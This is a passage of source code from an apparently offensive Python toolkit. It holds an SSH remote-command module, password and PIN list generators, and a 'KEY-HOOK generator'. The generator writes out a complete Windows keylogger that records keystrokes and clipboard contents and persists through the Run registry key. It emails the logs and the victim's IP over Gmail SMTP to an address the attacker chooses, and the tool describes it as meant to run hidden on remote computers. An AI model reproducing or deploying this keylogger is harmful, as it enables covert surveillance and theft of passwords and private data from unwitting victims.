            print(f'Type {Bcolors.WARNING}Login{Bcolors.ENDC}: ', end='')
            self.user = input('')
            print(f'Type {Bcolors.WARNING}Password{Bcolors.ENDC}: ', end='')
            self.passw = input('')
            Clear.clear()
            try:
                while True:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(self.ip_ssh, port=self.p, username=self.user, password=self.passw, timeout=5)
                    ssh_session = client.get_transport().open_session()
                    if ssh_session.active:
                        command = input('Command: ')
                        if command != '0':
                            ssh_session.exec_command(command)
                            print(ssh_session.recv(1024).decode('UTF-8'))
                        elif command == '0':
                            Clear.clear()
                            Main_menu.menu(self)
            except:
                    print(f'{Bcolors.Error}Error!{Bcolors.ENDC} Wrong Data! Do you want to  connect again one again? {Bcolors.WARNING}y/n{Bcolors.ENDC}')
                    ssh_again = input('> ')
                    if ssh_again == 'y':
                        Clear.clear()
                        SSH.ssh_command(self)
                    elif ssh_again == 'n':
                        Clear.clear()
                        Main_menu.menu(self)






class Key_Hook:

    def key_hook_check_compabilty(self):
        if os.name == 'nt':
            Key_Hook.menu_key_hook(self)
        elif os.name != 'nt':
            print(f'{Bcolors.Error}Error!{Bcolors.ENDC} Is not available on {Bcolors.WARNING}LINUX{Bcolors.ENDC} yet.')
            time.sleep(2)
            Clear.clear()
            Main_menu.menu(self)

    def menu_key_hook(self):
        print(f'Using this module you can generate{Bcolors.WARNING} KEY-HOOK{Bcolors.ENDC}. After generating {Bcolors.WARNING}KEY-HOOK{Bcolors.ENDC} you can sent him to remote computer. When you run this script on other machines, script will hide in procces. When remote computer starts up again, script too. Script will sent all symbols input from keyboard to given address email. Do you want to continue? {Bcolors.WARNING}y/n{Bcolors.ENDC} ?')
        key_hook_command = input('> ')
        if key_hook_command == 'y':
            Clear.clear()
            Key_Hook.key_hook_generator(self)
        elif key_hook_command == 'n':
            Clear.clear()
            Main_menu.menu(self)

    def key_hook_generator(self):
        print(f'-----------------{Bcolors.Magenta}KEY-HOOK GENERATOR{Bcolors.ENDC}--------------------------')
        print(f'For now working only with {Bcolors.WARNING}GMAIL{Bcolors.ENDC}')
        time.sleep(2)
        Clear.clear()
        try:
            self.check_default_key_hook = os.path.isdir(rf'C:\Users\{USER_NAME}\Desktop')
            self.check_default_key_hook = os.path.abspath(rf'C:\Users\{USER_NAME}\Desktop')
            self.check_default_key_hook = rf'C:\Users\{USER_NAME}\Desktop\winup.pyw'
        except:
            print(f'{Bcolors.Error}Error!{Bcolors.ENDC} I have problems with save!')
            time.sleep(2)
        Clear.clear()
        with open(self.check_default_key_hook, 'w') as f:
            f.write(r"""# -*- coding: utf-8 -*-

from ctypes import *
import pythoncom
import pyWinhook
import win32clipboard
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import sys, os
from os import path
import socket
import datetime
import getpass
import winreg



date = datetime.datetime.now()
date = date.strftime("%Y-%m-%d %H:%M")


ip = socket.gethostbyname(socket.gethostname())

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None


USER_NAME = getpass.getuser()

key = rf"C:\Users\{USER_NAME}\key.txt"


keyVal = 'Software\Microsoft\Windows\CurrentVersion\Run'

def add_to_registry():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, keyVal, 0, winreg.KEY_ALL_ACCESS)
    except:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyVal)
    winreg.SetValueEx(key, "lx", 0, winreg.REG_SZ, rf"C:\Users\{USER_NAME}\Desktop\winup.pyw")
    winreg.CloseKey(key)




def get_current_process():

    hwnd = user32.GetForegroundWindow()


    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))


    process_id = "%d" % pid.value


    executable = create_string_buffer(b"\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)


    window_title = create_string_buffer(b"\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)


    print()
    print("[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value))
    print()

    # zamknięcie uchwytów
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)


def KeyStroke(event):
    global current_window


    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()
    global x
    x = []
    if event.Ascii > 32 and event.Ascii < 127:
        x.append(event.Ascii)
        x = ''.join(chr(i) for i in x)
        with open(key, 'a') as fp:
            fp.write(f'{x}')

    if event.Ascii == 32 or event.Ascii == 9 or event.Ascii == 13:
        with open(key, 'a') as fp:
            fp.write('\n')

    b = os.path.getsize(rf"C:\Users\{USER_NAME}\key.txt")
    if b == 100:

        subject = f'IP: {ip}'
        message = f'Time: {date}'
        file_location = key

        msg = MIMEMultipart()
        msg['From'] = email
        msg['To'] = send_to_email
        msg['Subject'] = subject

        msg.attach(MIMEText(message, 'plain'))


        filename = os.path.basename(file_location)
        attachment = open(file_location, "rb")
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', "attachment; filename= %s" % filename)


        msg.attach(part)

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        text = msg.as_string()
        server.sendmail(email, send_to_email, text)
        server.quit()

    else:
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            print("[COPY] - %s" % (pasted_value)),
        else:
            print("[%s]" % event.Key),
    return True






""")
        print(f'Two email addresses {Bcolors.WARNING}required{Bcolors.ENDC}')
        print('Write the email name through which the script will send data: ', end='')
        sender_email = ''
        sender_email = input()
        print('Write password of this email: ', end='')
        key_password = ''
        key_password = input()
        print('Here write email name where script will send data: ', end='')
        key_send_to_email = ''
        key_send_to_email = input()
        print(f'The script will send all symbols from the keyboard on the computer on which it will run to this email address: {Bcolors.WARNING}{key_send_to_email}{Bcolors.ENDC}')
        input('Press enter to continue...')
        with open(self.check_default_key_hook, 'a') as f:
            f.write(rf"""
email = f'{sender_email}'
password = f'{key_password}'
send_to_email = f'{key_send_to_email}'
add_to_registry()
kl = pyWinhook.HookManager()
kl.KeyDown = KeyStroke
kl.HookKeyboard()
pythoncom.PumpMessages()
""")
        print()
        print(f'Script saved here: {Bcolors.WARNING}{self.check_default_key_hook}{Bcolors.ENDC}')
        time.sleep(3)
        Clear.clear()
        Main_menu.menu(self)





class Password_Generator:

    def password_generator_start(self):
        print(f'This module allows you to {Bcolors.WARNING}GENERATE ALL PASSWORD COMBINATION{Bcolors.ENDC} of the symbols given. Do you want to continue {Bcolors.WARNING}y/n{Bcolors.ENDC} ?')
        password_generator_start_choice = input('> ')
        if password_generator_start_choice == 'y':
            Clear.clear()
            Password_Generator.password_generator_menu(self)
        elif password_generator_start_choice == 'n':
            Clear.clear()
            Main_menu.menu(self)
        else:
            print(f'{Bcolors.Error}Error!{Bcolors.ENDC} Wrong option')
            time.sleep(1)
            Password_Generator.password_generator_start(self)

    def password_generator_menu(self):
        print(f'-----------------{Bcolors.Magenta}PASSWORD GENERATOR MODULE{Bcolors.ENDC}--------------------------')
        time.sleep(0.5)
        print(f'{Bcolors.WARNING}1.Password generator{Bcolors.ENDC}')
        time.sleep(0.5)
        print(f'{Bcolors.WARNING}2.PIN generator{Bcolors.ENDC}')
        time.sleep(0.5)
        print(f'{Bcolors.WARNING}0.BACK TO MAIN MENU{Bcolors.ENDC}')
        time.sleep(0.5)
        password_generator_menu_choice = str(input('> '))

        if password_generator_menu_choice == '1':
            Clear.clear()
            Password_Generator.password_generator_characters(self)
        elif password_generator_menu_choice == '2':
            Clear.clear()
            Password_Generator.pin_generator(self)
        elif password_generator_menu_choice == '0':
            Clear.clear()
            Main_menu.menu(self)
        else:
            print(f'{Bcolors.Error}Error!{Bcolors.ENDC} Wrong option!')
            time.sleep(1)
            Clear.clear()
            Password_Generator.password_generator_menu(self)


    def password_generator_characters(self):
        print(f'-----------------{Bcolors.Magenta}PASSWORD GENERATOR MODULE MENU{Bcolors.ENDC}--------------------------')
        print('Select the characters of which the password will consist')
        print(f'{Bcolors.WARNING}1.[a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,r,s,t,u,w,x,y,z]{Bcolors.ENDC}')
        print(f'{Bcolors.WARNING}2.[a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,r,s,t,u,w,x,y,z,!,@,#,$,%,^,&,*,(,),=,+,.,?,~]{Bcolors.ENDC}')
        print(f'{Bcolors.WARNING}3.[A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,R,S,T,U,W,Y,X,Z]{Bcolors.ENDC}')
        print(f'{Bcolors.WARNING}4.[A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,R,S,T,U,W,Y,X,Z,!,@,#,$,%,^,&,*,(,),=,+,.,?,~]{Bcolors.ENDC}')
        print(f'{Bcolors.WARNING}5.[a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,r,s,t,u,w,x,y,z,A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,R,S,T,U,W,Y,X,Z,!,@,#,$,%,^,&,*,(,),=,+,.,?,~]{Bcolors.ENDC}')
        print(f'{Bcolors.WARNING}0.BACK TO MAIN MENU{Bcolors.ENDC}')
        password_generator_menu_choice = str(input('> '))
        if password_generator_menu_choice == '1':
            Clear.clear()
            Password_Generator.password_generator_characters_small(self)
        elif password_generator_menu_choice == '2':
            Clear.clear()
            Password_Generator.password_generator_characters_small_and_scpecial_characters(self)
        elif password_generator_menu_choice == '3':
            Clear.clear()
            Password_Generator.password_generator_characters_LARGE(self)
        elif password_generator_menu_choice == '4':
            Clear.clear()
            Password_Generator.password_generator_characters_LARGE_and_special_characters(self)
        elif password_generator_menu_choice == '5':
            Clear.clear()
            Password_Generator.password_generator_all_characters(self)
        elif password_generator_menu_choice == '0':
            Clear.clear()
            Main_menu.menu(self)
        else:
            print(f'{Bcolors.Error}Error!{Bcolors.ENDC} Wrong option!')
            time.sleep(1)
            Clear.clear()
            Password_Generator.password_generator_characters(self)

    def password_generator_characters_small(self):
        Password_Generator.password_generator_save(self)
        Clear.clear()
        print(f'-----------------{Bcolors.Magenta}PASSWORD GENERATOR MODULE{Bcolors.ENDC}--------------------------')
        characters_small = 'abcdefghijklmnoprstquwxyz'
        print('Enter the password length [number]: ', end='')
        password_generator_characters_small_lenght = int(input())
        print('Enter the numbers of password [number]: ', end='')
        password_generator_characters_small_number = int(input())
        start_time = time.time()
        print()
        with open(self.password_save, 'w') as f:
            for small_password in range(password_generator_characters_small_number):
                password_small = ''
                for small_characters in range(password_generator_characters_small_lenght):
                    password_small += random.choice(characters_small)
                f.write(str(password_small) + str(f'\n'))
                print(password_small)

        print(f'{Bcolors.Pass}\nSucces!{Bcolors.ENDC} Script save output here {Bcolors.WARNING}{self.password_save}{Bcolors.ENDC}')
        print(f'Number of generated passwords: {Bcolors.WARNING}{password_generator_characters_small_number}{Bcolors.ENDC}')
        print(f"Execution time: {Bcolors.WARNING}%s{Bcolors.ENDC} seconds" % (time.time() - start_time))
        input('Press enter to continue...')
        Clear.clear()
        Password_Generator.password_generator_menu(self)

    def password_generator_characters_small_and_scpecial_characters(self):
        Password_Generator.password_generator_save(self)
        Clear.clear()
        print(f'-----------------{Bcolors.Magenta}PASSWORD GENERATOR MODULE{Bcolors.ENDC}--------------------------')
        characters_and_special_small = 'abcdefghijklmnoprstquwxyz!@#$%^&*()=+.?~'
        print('Enter the password length [number]: ', end='')
        password_generator_characters_small_and_special_lenght = int(input())
        print('Enter the numbers of password [number]: ', end='')
        password_generator_characters_small_and_special_number = int(input())
        start_time = time.time()
        print()
        with open(self.password_save, 'w') as f:
            for small_and_special_password in range(password_generator_characters_small_and_special_number):
                password_small_and_special = ''
                for small_and_special_characters in range(password_generator_characters_small_and_special_lenght):
                    password_small_and_special += random.choice(characters_and_special_small)
                f.write(str(password_small_and_special) + str(f'\n'))
                print(password_small_and_special)

        print(f'{Bcolors.Pass}\nSucces!{Bcolors.ENDC} Script save output here {Bcolors.WARNING}{self.password_save}{Bcolors.ENDC}')
        print(f'Number of generated passwords: {Bcolors.WARNING}{password_generator_characters_small_and_special_number}{Bcolors.ENDC}')
        print(f"Execution time: {Bcolors.WARNING}%s{Bcolors.ENDC} seconds" % (time.time() - start_time))
        input('Press enter to continue...')
        Clear.clear()
        Password_Generator.password_generator_menu(self)

    def password_generator_characters_LARGE(self):
        Password_Generator.password_generator_save(self)
        Clear.clear()
        print(f'-----------------{Bcolors.Magenta}PASSWORD GENERATOR MODULE{Bcolors.ENDC}--------------------------')
        characters_LARGE = 'ABCDEFGHIJKLMNOPRSTQUWXYZ'
        print('Enter the password length [number]: ', end='')
        password_generator_characters_LARGE_lenght = int(input())
        print('Enter the numbers of password [number]: ', end='')
        password_generator_characters_LARGE_number = int(input())
        start_time = time.time()
        print()
        with open(self.password_save, 'w') as f:
            for LARGE_password in range(password_generator_characters_LARGE_number):
                password_LARGE = ''
                for lARGE_characters in range(password_generator_characters_LARGE_lenght):
                    password_LARGE += random.choice(characters_LARGE)
                f.write(str(password_LARGE) + str(f'\n'))
                print(password_LARGE)

        print(f'{Bcolors.Pass}\nSucces!{Bcolors.ENDC} Script save output here {Bcolors.WARNING}{self.password_save}{Bcolors.ENDC}')
        print(f'Number of generated passwords: {Bcolors.WARNING}{password_generator_characters_LARGE_number}{Bcolors.ENDC}')
        print(f"Execution time: {Bcolors.WARNING}%s{Bcolors.ENDC} seconds" % (time.time() - start_time))
        input('Press enter to continue...')
        Clear.clear()
        Password_Generator.password_generator_menu(self)

    def password_generator_characters_LARGE_and_special_characters(self):
        Password_Generator.password_generator_save(self)
        Clear.clear()
        print(f'-----------------{Bcolors.Magenta}PASSWORD GENERATOR MODULE{Bcolors.ENDC}--------------------------')
        characters_LARGE_and_special = 'ABCDEFGHIJKLMNOPRSTQUWXYZ!@#$%^&*()=+,.?~'
        print('Enter the password length [number]: ', end='')
        password_generator_characters_LARGE_and_special_lenght = int(input())
        print('Enter the numbers of password [number]: ', end='')
        password_generator_characters_LARGE_and_special_number = int(input())
        start_time = time.time()
        print()
        with open(self.password_save, 'w') as f:
            for LARGE_and_special_password in range(password_generator_characters_LARGE_and_special_number):
                password_LARGE_and_special = ''
                for lARGE_and_special_characters in range(password_generator_characters_LARGE_and_special_lenght):
                    password_LARGE_and_special += random.choice(characters_LARGE_and_special)
                f.write(str(password_LARGE_and_special) + str(f'\n'))
                print(password_LARGE_and_special)

        print(f'{Bcolors.Pass}\nSucces!{Bcolors.ENDC} Script save output here {Bcolors.WARNING}{self.password_save}{Bcolors.ENDC}')
        print(f'Number of generated passwords: {Bcolors.WARNING}{password_generator_characters_LARGE_and_special_number}{Bcolors.ENDC}')
        print(f"Execution time: {Bcolors.WARNING}%s{Bcolors.ENDC} seconds" % (time.time() - start_time))
        input('Press enter to continue...')
        Clear.clear()
        Password_Generator.password_generator_menu(self)

    def password_generator_all_characters(self):
        Password_Generator.password_generator_save(self)
        Clear.clear()
        print(f'-----------------{Bcolors.Magenta}PASSWORD GENERATOR MODULE{Bcolors.ENDC}--------------------------')
        characters_all = 'abcdefghijklmnoprstquwxyzABCDEFGHIJKLMNOPRSTQUWXYZ!@#$%^&*()=+,.?~'
        print('Enter the password length [number]: ', end='')
        password_generator_all_length = int(input())
        print('Enter the numbers of password [number]: ', end='')
        password_generator_all_number = int(input())
        start_time = time.time()
        print()
        with open(self.password_save, 'w') as f:
            for password_mix in range(password_generator_all_number):
                password_generator_all = ''
                for password_mix_characters in range(password_generator_all_length):
                    password_generator_all += random.choice(characters_all)
                f.write(str(password_generator_all) + str(f'\n'))
                print(password_generator_all)

            print(f'{Bcolors.Pass}\nSucces!{Bcolors.ENDC} Script save output here {Bcolors.WARNING}{self.password_save}{Bcolors.ENDC}')
            print(f'Number of generated passwords: {Bcolors.WARNING}{password_generator_all_number}{Bcolors.ENDC}')
            print(f"Execution time: {Bcolors.WARNING}%s{Bcolors.ENDC} seconds" % (time.time() - start_time))
            input('Press enter to continue...')

        Clear.clear()
        Password_Generator.password_generator_menu(self)


    def password_generator_save(self):
        if os.name == 'nt':
            self.check_default_password_save = os.path.isdir(rf'C:\Users\{USER_NAME}\Desktop')
        if os.name != 'nt':
            self.check_default_password_save = os.path.isdir(rf'/root')
        if self.check_default_password_save == True:
            if os.name == 'nt':
                self.check_default_password_save = os.path.abspath(rf'C:\Users\{USER_NAME}\Desktop')
                print(
                    f"Do you to want scripts to save the result in its default location {Bcolors.WARNING}y/n{Bcolors.ENDC}?  {Bcolors.WARNING}{self.check_default_password_save}{Bcolors.ENDC}")
                self.check_default_password_save = rf'C:\Users\{USER_NAME}\Desktop\PASSWORDS.txt'
                self.check_default_choice_password_save = str(input('> '))
            if os.name != 'nt':
                self.check_default_password_save = os.path.abspath(rf'/root')
                print(
                    f"Do you to want scripts to save the result in its default location {Bcolors.WARNING}y/n{Bcolors.ENDC}?  {Bcolors.WARNING}{self.check_default_password_save}{Bcolors.ENDC}")
                self.check_default_password_save = rf'/root/PASSWORDS.txt'
                self.check_default_choice_password_save = str(input('> '))

            if self.check_default_choice_password_save == 'y':
                self.password_save = self.check_default_password_save
            elif self.check_default_choice_password_save == 'n':
                try:
                    print('Type path where script will save output: ', end='')
                    self.password_save = str(input(r''))
                    with open(f'{self.password_save}', 'w') as f:
                        f.write(str('PASSWORD GENERATOR'))
                except OSError:
                    if path.isfile(fr'{self.password_save}') == False:
                        print(f'{Bcolors.Error}Error!{Bcolors.ENDC} Wrong file name!')
                        time.sleep(2)
                        Password_Generator.password_generator_save(self)



        else:
            print(f'{Bcolors.Error}Error!{Bcolors.ENDC} Wrong option!')
            time.sleep(2)
            Clear.clear()
            Password_Generator.password_generator_save(self)


    def pin_generator(self):
        if os.name == 'nt':
            self.check_default_pin = os.path.isdir(rf'C:\Users\{USER_NAME}\Desktop')
        if os.name != 'nt':
            self.check_default_pin = os.path.isdir(rf'/root')
        if self.check_default_pin == True:
            if os.name == 'nt':
                self.check_default_pin = os.path.abspath(rf'C:\Users\{USER_NAME}\Desktop')
                print(
                    f"Do you want to scripts to save the result in its default location {Bcolors.WARNING}y/n{Bcolors.ENDC}?  {Bcolors.WARNING}{self.check_default_pin}{Bcolors.ENDC}")
                self.check_default_pin = rf'C:\Users\{USER_NAME}\Desktop\PIN.txt'
                self.check_default_choice_pin = str(input('> '))
            if os.name != 'nt':
                self.check_default_pin = os.path.abspath(rf'/root')
                print(
                    f"Do you want to scripts to save the result in its default location {Bcolors.WARNING}y/n{Bcolors.ENDC}?  {Bcolors.WARNING}{self.check_default_pin}{Bcolors.ENDC}")
                self.check_default_pin = rf'/root/PIN.txt'
                self.check_default_choice_pin = str(input('> '))

            if self.check_default_choice_pin == 'y':
                self.PIN = self.check_default_pin
            elif self.check_default_choice_pin == 'n':
                try:
                    print('Type path where script will save output: ', end='')
                    self.PIN = str(input(r''))
                    with open(f'{self.PIN}', 'w') as f:
                        f.write(str('PIN GENERATOR'))
                except OSError:
                    if path.isfile(fr'{self.PIN}') == False:
                        print(f'{Bcolors.Error}Error!{Bcolors.ENDC} Wrong file name!')
                        time.sleep(2)
                        Password_Generator.pin_generator(self)


        else:
            print(f'{Bcolors.Error}Error!{Bcolors.ENDC} Wrong option!')
            time.sleep(2)
            Clear.clear()
            Password_Generator.pin_generator(self)
        self.start_time = time.time()
        with open(self.PIN, 'w') as f:
            for self.c, self.pin in enumerate(list(product(range(10), repeat=4)), 1):
                print("%s%s%s%s" % self.pin)
                f.write(str("%s%s%s%s" % self.pin) + str(f'\n'))
            print()
            print(f'Numbers of generated items: {Bcolors.WARNING}{self.c}{Bcolors.ENDC}')

        print(f"Execution time: {Bcolors.WARNING}%s{Bcolors.ENDC} seconds" % (time.time() - self.start_time))
        print(f'{Bcolors.Pass}Succes!{Bcolors.ENDC} Script save output here {Bcolors.WARNING}{self.PIN}{Bcolors.ENDC}')
        input('Press enter to continue...')
        Clear.clear()
        Password_Generator.password_generator_menu(self)


L = Lamia()
L.start_up()

#VERSION 1.3